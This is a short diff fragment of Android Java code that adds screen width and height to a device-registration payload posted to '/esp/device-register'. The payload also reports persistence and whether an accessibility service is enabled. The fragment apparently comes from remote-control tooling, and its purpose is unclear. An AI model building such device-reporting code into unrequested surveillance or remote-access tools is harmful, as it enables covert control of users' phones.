         b.put("user", "android"); b.put("arch", Build.SUPPORTED_ABIS[0]);
         b.put("persistent", true);
         b.put("full", isAccEnabled());
+        b.put("screen_w", wh[0]);
+        b.put("screen_h", wh[1]);
         post("/esp/device-register", b);
     }
 
